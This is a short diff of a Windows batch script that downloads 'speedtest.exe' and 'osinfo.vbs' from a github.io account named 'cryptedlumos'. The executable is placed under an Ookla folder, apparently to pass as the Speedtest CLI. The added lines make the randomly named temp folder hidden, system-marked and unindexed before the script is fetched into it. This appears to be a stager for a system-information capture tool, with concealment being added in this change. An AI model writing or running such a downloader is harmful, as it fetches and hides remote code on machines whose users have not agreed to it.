@@ -20,7 +20,8 @@ curl.exe %proxy% https://cryptedlumos.github.io/Capture/speedtest-cli.ini --outp
 curl.exe %proxy% https://cryptedlumos.github.io/Capture/speedtest.exe --output "%appdata%\Ookla\Speedtest CLI\speedtest.exe"
 
 set "folder=%random%"
-mkdir "%temp%\%folder%"
+mkdir "%temp%\%folder%" 
+attrib +s +h +i "%temp%\%folder%" 
 cd "%temp%\%folder%"
 
 curl.exe %proxy% https://cryptedlumos.github.io/Capture/osinfo.vbs --output "osinfo.vbs"
